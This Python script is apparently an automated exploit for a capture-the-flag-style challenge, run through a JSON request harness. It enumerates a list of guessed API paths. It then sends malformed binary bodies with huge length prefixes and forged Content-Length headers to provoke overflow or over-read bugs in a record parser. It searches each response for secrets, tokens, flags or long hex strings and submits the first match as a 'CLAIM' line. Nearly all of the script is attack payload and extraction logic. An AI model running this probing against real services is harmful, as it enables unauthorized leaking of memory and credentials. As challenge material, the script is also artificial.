import sys, json, base64, re

def req(obj):
    sys.stdout.write(json.dumps(obj) + "\n")
    sys.stdout.flush()
    line = sys.stdin.readline()
    if not line:
        return None
    line = line.strip()
    if not line:
        return None
    try:
        return json.loads(line)
    except Exception:
        return None

PATHS = ["/", "/parse", "/records", "/record", "/api/parse", "/api/records", "/api/record",
         "/api/v1/parse", "/v1/parse", "/v1/records", "/health", "/healthz", "/status", "/info",
         "/upload", "/data", "/read", "/frame", "/packet", "/decode", "/api", "/index.html",
         "/parser", "/parsing", "/input", "/submit", "/process", "/msg", "/message", "/entry",
         "/entries", "/objects", "/blob", "/raw", "/request", "/route", "/rpc", "/query"]

BODIES = []
def add(h):
    BODIES.append(h)

add("ffffffff" + "00" * 4)
add("ffffffff" + "41" * 32)
add("ffffff7f" + "00" * 4)
add("04000000" + "41" * 8)
add("08000000" + "41" * 8)
add("ffffffff" + "41" * 256)
add("0000ffff" + "41" * 32)
add("ffff" + "41" * 32)
add("ffffffffffffffff" + "41" * 32)
add("00" * 8)
add("ffffffff80000000" + "41" * 16)
add(("4294967295:" + "A" * 16).encode().hex())
add(("len=4294967295;data=" + "A" * 16).encode().hex())
add(("\xff\x00\x00\x00" * 4).encode().hex())
add(("A" * 8 + "\xff\xff\xff\xff").encode().hex())

best = []

def scan(body, tag):
    if not body:
        return None
    txt = body.decode("utf-8", "replace")
    found = []
    try:
        j = json.loads(txt)
    except Exception:
        j = None
    if j is not None:
        def walk(o, depth=0):
            if depth > 6:
                return
            if isinstance(o, dict):
                for k, v in o.items():
                    if isinstance(v, str) and re.search(r"secret|token|flag|pass|key", str(k), re.I):
                        found.append((str(k), v))
                    walk(v, depth + 1)
            elif isinstance(o, list):
                for x in o:
                    walk(x, depth + 1)
        walk(j)
    if re.search(r"secret|flag|SECRET|FLAG", txt):
        for m in re.finditer(r"[0-9a-fA-F]{16,}", txt):
            found.append(("hex", m.group(0)))
    if found:
        best.append((tag, found, txt[:300]))
    return found

live = []
for p in PATHS:
    r = req({"http": {"method": "GET", "path": p}})
    if not r:
        break
    st = r.get("status")
    b = b64 = r.get("body_b64")
    body = b""
    if b64:
        try:
            body = base64.b64decode(b64)
        except Exception:
            body = b""
    scan(body, ("GET", p))
    if st and st != 404:
        live.append(p)

if not live:
    live = PATHS[:12]

for p in live:
    for i, h in enumerate(BODIES):
        r = req({"http": {"method": "POST", "path": p, "body_hex": h}})
        if not r:
            break
        b64 = r.get("body_b64")
        body = b""
        if b64:
            try:
                body = base64.b64decode(b64)
            except Exception:
                body = b""
        scan(body, ("POST", p, i))

for p in live[:6]:
    for hv in ["4294967295", "999999999999", "2147483647"]:
        r = req({"http": {"method": "POST", "path": p, "body": "A" * 16,
                          "headers": {"Content-Length": hv, "X-Record-Length": hv, "X-Length": hv}}})
        if not r:
            break
        b64 = r.get("body_b64")
        body = b""
        if b64:
            try:
                body = base64.b64decode(b64)
            except Exception:
                body = b""
        scan(body, ("HDR", p, hv))

hexre = re.compile(r"^[0-9a-fA-F]+$")
val = None
for tag, found, snip in best:
    for k, v in found:
        s = str(v).strip()
        if not s:
            continue
        if k == "hex":
            if len(s) % 2 == 0:
                val = s.lower()
                break
        else:
            if hexre.match(s) and len(s) % 2 == 0 and len(s) >= 16:
                val = s.lower()
            else:
                val = s.encode("utf-8", "replace").hex()
            break
    if val:
        break

if not val:
    allsnip = " | ".join(s for _, _, s in best)
    m = re.findall(r"[0-9a-fA-F]{16,}", allsnip)
    if m:
        val = m[0].lower()

if val:
    sys.stdout.write("CLAIM:" + json.dumps({"secret_hex": val}) + "\n")
    sys.stdout.flush()